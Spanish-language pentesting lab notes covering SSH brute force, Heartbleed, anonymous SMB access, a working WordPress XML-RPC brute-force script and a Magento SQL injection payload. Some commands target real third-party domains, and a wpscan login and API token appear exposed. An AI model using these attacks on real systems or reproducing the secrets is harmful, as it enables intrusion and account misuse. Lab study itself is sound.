> En google filtrar por "Nombre de gestor de contenido" vulnerability scanner github
---
## Enumeración Servicio SSH
---

> Bruteforce a ssh 

```bash
hydra -l sergsec -P passwd.txt ssh://127.0.0.1 -s 2222
```


> Codename

- Simplemente saber la versión con nmap -sVC y buscarla en google acompañada de "launchpad" para encontrar el **Codename**
![[Pasted image 20250310171433.png]]

![[Pasted image 20250310171612.png]]

-----
## Enumeración Servicio HTTP

Atacaremos al docker que hay en ➡️ https://github.com/vulhub/vulhub/tree/master/openssl/CVE-2014-0160

- Arroja info de certificados ssl si es vulnerable a **heartbleed** la cuál podremos explotar

> ***Heardtbleed:*** vulnerbailidad que aprovecha el acceso a un server a través de la memoria por una missconfig de OpenSSL


```bash
openssl s_client -connect tinder.com:443 fincasperezmunoz.com
```

- **sslscan:** se enfoca en evaluar la seguridad de las configuraciones de  certififcados SSL

```bash 
sslscan fincasperezmunoz.com
```

- **sslyze:** se centra en la **identificación** de los **protocolos** SSL/TLS admitidos por el servidor y los cifrados utilizados.
```bash
sslyze fincasperezmunoz.com
```


sslscan 127.0.0.1:8443

Atacamos a vulhub/openssl/CVE-2014-0160

![[Pasted image 20250310175452.png]]

![[Pasted image 20250310175548.png]]

>Con esta vuln conseguimos divulgación de info
- https://github.com/H4R335HR/heartbleed/blob/main/heartbleed.py
- https://github.com/vulhub/vulhub/blob/master/openssl/CVE-2014-0160/ssltest.py

```bash
python3 ssltest.py 127.0.0.1 -p 8443 | grep -v "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"

```

## Enumeración del servicio SMB

- **Recon**
- Listaremos info y no nos pide credens
```bash
smbclient -L 127.0.0.1 -N
```

![[Pasted image 20250310181350.png]]

```bash
smbmap -H 127.0.0.1  
```

![[Pasted image 20250310182618.png]]

netexec smb 127.0.0.1
![[Pasted image 20250310183902.png]]

- Con  **nmap -A**  a veces da más info
![[Pasted image 20250310182505.png]]

- **Intrusión**
1. Accedemos sin passwd
``` bash
smbclient //127.0.0.1/myshare -N
```

2. Podemos ejecutar los comandos 
**put,get,dir

```bash
mount -t cifs //127.0.0.1/myshare aquitemonto -o username=null,password=null,domain=,rw
```

****Cuidado porque se crea un enlace simbólico y lo que editemos en local se crea en la máquina real

## Enumeración de (CMS) – WordPress

- Docker con wordpress vulnerable en --> https://github.com/vavkamil/dvwp

`kajacak514@dwriters.com:Wpscan,1023`

```bash
wpscan --api-token 8t2BRF83up8MueGSfRN322DsVM5xVStanr57aowC8bQ --detection-mode mixed --rua --disable-tls-checks -e u,dbe,cb,vp,vt -v -o salida.wpscan --url http://127.0.0.1:31337
```

```bash
searchsploit wordpress user enumeration
```

```bash
searchsploit -x 41497 
```

- Regex para ver plugins del source code de wordpress, muestra únicamente los plugins
```bash
curl -s -X GET "http://127.0.0.1:31337" | grep -oP "plugins/\K\[^/]+" | sort -u
```

![[Pasted image 20250311004048.png]]

![[Pasted image 20250311004133.png]]

- **Para descargar exploit
```
searchsploit -m php/webapps/46794.py 
```

- **BForce a XMLRPC
```bash
wpscan --api-token --url http://127.0.0.1:31337 -U sergsec -P /usr/share/wordlists/rockyou.txt
```

Copiar script en bash y crear una carpeta payloads con él

- A través del método  **wp.getUsersBlogs** , bruteforcearemos con un script en bash

```bash
trap ctrl_c SIGINT

function createXML( ){

    password=$1  

   xmlFile="""
<? xml version=\"1.0\" encoding=\"UTF-8\"?>
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>serg</value></param> # cambiar user
<param><value>$password</value></param>
</params>
</methodCall>"""

    echo $xmlFile > file.xml
    response=$(curl -s -X POST "http://localhost:31337/xmlrpc.php" -d@file.xml) # cambiar target  

if [ ! "$(echo $response | grep 'Incorrect username or password. ' )" ]; then
    echo -e "\n[+] La contraseña para el usuario serg es $password"
    exit 0
fi
}
cat /usr/share/wordlists/rockyou.txt | while read password; do # cambiar wordlist si aplicase
    createXML $password
done
```

## Enumeración de Joomla

Simplemente vamos a enumerar que es lo que podemos ver y que CVE o directorios tiene la máquina 
> **Utilizaremos:**
> https://github.com/OWASP/joomscan.git

```bash
perl joomscan.pl -r -ec -u http://192.168.1.135:8080/
```

## Enumeración de Drupal

```bash
whatweb http://127.0.0.1:8080 


./ffuf -c -t 200  -w /usr/share/wordlists/dirb/common.txt -u http://localhost:8080/FUZZ/ 
```

> Esto nos devuelve whatweb
`http://127.0.0.1:8080 [200 OK] Apache[2.4.25], Content-Language[es], Country[RESERVED][ZZ], Drupal, HTML5, HTTPServer[Debian Linux][Apache/2.4.25 (Debian)], IP[127.0.0.1], MetaGenerator[Drupal 8 (https://www.drupal.org)], PHP[7.2.3], PoweredBy[-block], Script, Title[Bienvenido a SitiodeSergioSec | SitiodeSergioSec], UncommonHeaders[x-drupal-dynamic-cache,x-content-type-options,x-generator,x-drupal-cache], X-Frame-Options[SAMEORIGIN], X-Powered-By[PHP/7.2.3], X-UA-Compatible[IE=edge]
`

`https://github.com/SamJoan/droopescan`

droopscan scan drupal --url https:127.0.0.1:8080

**No reporta nada**

> Con Burp le mandamos esta request al registrar un user

![[Pasted image 20250312195231.png]]


## Enumeración a Magento


- Utilizamos Este repositorio para ello , nos aclara las rutas, y versiones 
> `https://github.com/steverobbins/magescan`

`php magescan.phar scan:all http://Ip:port`

>Dejaré este script en python en la misma carpeta que el repo de magscan
>>[SqliMagento](https://github.com/ambionics/magento-exploits/blob/master/magento-sqli.py)

- **Este script prueba en la ruta que especifico abajo SQLI**
>Necesitaremos que haya sesiones activas para poder robarlas cookies

`https://ejemplo.com/catalog/product_frontend_action/synchronize?type_id=recently_products&ids[0][product_id][to]=))) OR (SELECT 1 UNION SELECT 2 FROM DUAL WHERE 123=123) `

